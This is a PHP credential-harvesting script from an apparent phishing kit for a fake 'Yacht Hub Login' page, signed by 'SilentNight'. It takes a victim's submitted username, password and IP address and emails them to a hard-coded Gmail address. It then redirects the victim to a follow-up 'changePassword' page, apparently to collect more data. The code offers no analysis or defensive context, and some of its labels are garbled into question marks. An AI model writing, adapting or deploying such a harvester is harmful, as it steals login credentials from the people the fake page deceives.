<?

$ip = getenv("REMOTE_ADDR");
$message .= "--------------Yacht Hub Login---------------------\n";
$message .= "??????: ".$_POST['name']."\n";
$message .= "?? : ".$_POST['name0']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By SilentNight--------------------\n";
$recipient = "ndaagoddy@gmail.com";
$subject = "Yacht Hub Login";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "Texlon-Version: 1.0\n";
	 mail("", "Texlon$", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: changePassword.db.htm");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>

